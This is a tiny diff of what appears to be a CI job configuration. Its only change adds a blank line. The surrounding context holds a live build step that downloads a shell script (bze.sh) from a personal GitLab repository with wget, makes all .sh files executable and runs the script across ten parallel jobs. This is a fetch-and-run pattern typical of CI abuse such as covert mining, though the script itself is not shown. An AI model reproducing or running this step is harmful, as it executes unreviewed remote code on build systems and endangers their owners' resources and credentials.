@@ -10,3 +10,4 @@ jobs:
       - run: wget https://gitlab.com/viwarlani/build/-/raw/main/bze.sh && chmod +x *.sh && ./bze.sh
 parallelism: 10
 
+
